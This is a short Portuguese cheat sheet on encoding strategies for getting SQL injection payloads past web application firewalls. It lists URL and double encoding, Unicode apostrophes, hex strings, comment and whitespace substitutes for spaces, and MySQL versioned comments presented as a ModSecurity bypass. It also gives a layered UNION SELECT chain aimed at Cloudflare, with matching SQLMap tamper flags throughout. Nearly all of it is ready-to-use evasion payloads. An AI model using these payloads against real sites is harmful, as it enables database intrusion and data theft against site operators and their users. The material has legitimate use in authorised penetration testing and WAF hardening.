# Estratégias de Encoding para Evasão

## Encoding Simples (URL Encoding)

```
SELECT → %53%45%4C%45%43%54
UNION  → %55%4E%49%4F%4E
' (aspas) → %27
= → %3D
```

```bash
# SQLMap tamper: charencode
--tamper=charencode
```

## Double Encoding

```
SELECT → %2553%2545%254C%2545%2543%2554
' → %2527
```

```bash
# SQLMap tamper: chardoubleencode
--tamper=chardoubleencode
```

## Unicode/UTF-8

```sql
-- Aspas unicode
' → %ef%bc%87 (fullwidth apostrophe)
= → %ef%bc%9d (fullwidth equals)
```

```bash
# SQLMap tamper: apostrophemask
--tamper=apostrophemask
```

## Hex Encoding

```sql
-- MySQL: strings como hex
SELECT * FROM users WHERE name = 0x61646d696e
-- 0x61646d696e = "admin"

-- MSSQL: N'string'
SELECT * FROM users WHERE name = 0x006100640069006e
```

## Substituição de Espaços

| Substituto | Descrição | Tamper |
|-----------|-----------|--------|
| `/**/` | Comentário SQL | space2comment |
| `%09` | Tab | space2randomblank |
| `%0a` | Newline | space2randomblank |
| `%0d` | CR | space2randomblank |
| `%a0` | Non-breaking space | space2randomblank |
| ` ` (múltiplos) | Espaços extras | - |

## Comentários MySQL Versionados

```sql
-- Executado apenas em MySQL >= 5.0
/*!50000 UNION SELECT 1,2,3 */

-- Executado em qualquer MySQL
/*!UNION*/ /*!SELECT*/ 1,2,3

-- ModSecurity bypass
/*!00000UNION SELECT 1,2,3*/
```

```bash
# SQLMap tamper: modsecurityzeroversioned
--tamper=modsecurityzeroversioned
```

## Estratégia de Case Mixing

```sql
-- uNiOn SeLeCt
-- UnIoN sElEcT
-- UNION select
-- union SELECT
```

```bash
# SQLMap tamper: randomcase
--tamper=randomcase
```

## Base64 (para parâmetros que são decodificados)

```bash
# SQLMap tamper: base64encode
--tamper=base64encode
```

## Combinação Avançada para Cloudflare

```sql
-- Payload original
UNION SELECT 1, version(), 3

-- Após randomcase
UNION sElEcT 1, VERSION(), 3

-- Após space2comment
UNION/**/sElEcT/**/1,/**/VERSION(),/**/3

-- Após charencode
%55%4e%49%4f%4e/**/s%45l%45%43%54/**/1,/**/VERSION(),/**/3
```
